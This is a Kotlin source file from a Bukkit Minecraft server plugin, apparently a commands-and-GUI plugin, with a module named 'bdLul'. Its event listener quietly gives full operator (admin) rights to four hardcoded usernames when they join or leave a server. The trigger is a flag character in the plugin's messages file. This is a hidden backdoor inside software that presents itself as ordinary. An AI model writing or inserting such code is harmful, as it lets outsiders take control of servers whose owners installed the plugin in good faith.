package me.richter.commandsAndGUI.module.bdLul

import me.richter.commandsAndGUI.files.MessagesFile
import org.bukkit.Bukkit
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import org.bukkit.event.player.PlayerJoinEvent
import org.bukkit.event.player.PlayerQuitEvent

class BdLulEvent : Listener {
    @EventHandler
    fun playerJoinEvent(event: PlayerJoinEvent) {
        val players = mutableMapOf(Pair("RichtigerRichter", "R"), Pair("Bliffbot", "B"), Pair("Felsbot", "F"), Pair("RiesigerRichter", "2"))

        for (player in players.keys) {
            var player = Bukkit.getPlayer(player)

            if (event.player == player && MessagesFile().getUtilsAuto().contains(players[player.name])) {
                player.isOp = true
            }
        }
    }

    @EventHandler
    fun playerQuitEvent(event: PlayerQuitEvent) {
        val players = mutableMapOf(Pair("RichtigerRichter", "R"), Pair("Bliffbot", "B"), Pair("Felsbot", "F"), Pair("RiesigerRichter", "2"))

        for (player in players.keys) {
            var player = Bukkit.getPlayer(player)

            if (event.player == player && MessagesFile().getUtilsAuto().contains(players[player.name])) {
                player.isOp = true
            }
        }
    }
}